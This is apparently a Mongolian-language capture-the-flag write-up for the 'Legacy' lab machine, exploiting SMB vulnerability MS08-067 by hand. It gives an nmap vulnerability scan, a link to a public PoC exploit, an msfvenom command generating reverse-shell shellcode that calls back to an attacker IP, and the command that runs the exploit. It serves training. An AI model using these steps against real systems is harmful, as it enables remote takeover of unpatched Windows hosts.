# Legacy - smb-vuln / MS08-067

SMB эмзэг байдлыг metasploit ашиглан хийж болох ч гар аргаар shellcode үүсгэх байдлаар хийх боломжтой.

## PoC - ms08-067

https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py

## Enumeration

```bash
nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.10.10.4
```

```bash
/usr/share/nmap/scripts/ | grep smb | grep vuln
```

## Shellcode Generate

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=1212 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

[image]

## Add shellcode to PoC

[image]

## Run

```bash
python smb.py 10.10.10.4 6 445
```

## Reverse shell

[image]
